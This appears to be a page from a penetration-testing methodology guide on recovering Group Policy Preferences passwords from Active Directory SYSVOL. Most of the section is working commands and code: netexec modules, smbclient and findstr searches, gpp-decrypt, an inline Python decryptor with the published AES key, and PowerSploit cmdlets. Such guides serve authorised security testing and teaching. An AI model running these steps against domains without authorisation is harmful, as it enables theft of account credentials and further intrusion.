---
title: "16 · GPP / SYSVOL Credential Attacks"
---

# 16 · GPP / SYSVOL Credential Attacks

> Group Policy Preferences passwords were 'encrypted' with a public AES key. Microsoft confirmed it.

!!! note "Phase overview"
    Group Policy Preferences let admins set local account passwords via XML files in `SYSVOL`. Microsoft published the AES key that encrypts these passwords in 2012. MS14-025 (2014) prevents NEW GPP cpasswords but doesn't remove existing ones, so any environment with legacy GPOs is still vulnerable. Every domain user can read SYSVOL → every domain user can decrypt these passwords.

### 16.1 · Find and Decrypt GPP Passwords

!!! info "Why this works / how it chains"

    netexec's gpp_password module finds and decrypts in one call. Manually: smbclient into SYSVOL, find . -name '*.xml', grep cpassword, decrypt with gpp-decrypt or the inline Python snippet (the AES key is hardcoded into Microsoft's docs not a secret).

!!! warning "What leads here"
    - Any domain credentials
    - SYSVOL accessible (always is for domain users)
    - Old GPP XML files exist with cpassword field
    - Signs: Groups.xml, ScheduledTasks.xml, Services.xml, Printers.xml in SYSVOL

```bash title="Auto: netexec modules"
# Some examples:

# Linux - search SYSVOL
nxc smb <DC_IP> -u user -p pass -M gpp_password
nxc smb <DC_IP> -u user -p pass -M gpp_autologin

# Manual search via SMB
smbclient //<DC_IP>/SYSVOL -U user%pass
# Then: find . -name "*.xml" | xargs grep -l cpassword
```

```bash title="Decrypt cpassword (Linux)"
# Linux - decrypt manually
sudo apt install gpp-decrypt -y
gpp-decrypt 'cpassword_value_here'
```

```python title="Decrypt cpassword (Python inline)"
python3 -c "
import base64
from Crypto.Cipher import AES
key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
cpass = 'YOUR_CPASSWORD_HERE'
cpass += '=' * (4 - len(cpass) % 4)
decoded = base64.b64decode(cpass)
cipher = AES.new(key, AES.MODE_CBC, decoded[:16])
print(cipher.decrypt(decoded[16:]).rstrip(b'\\x00\\x08\\x09\\x0a').decode())
"
```

```powershell title="Windows: PowerSploit + manual findstr"
# Windows - PowerSploit
Import-Module .\PowerSploit.ps1
Get-GPPPassword
Get-GPPAutologon  # autologon credentials from registry.pol

# Find cpassword in SYSVOL manually
findstr /S /I cpassword \\domain.local\sysvol\domain.local\policies\*.xml
```

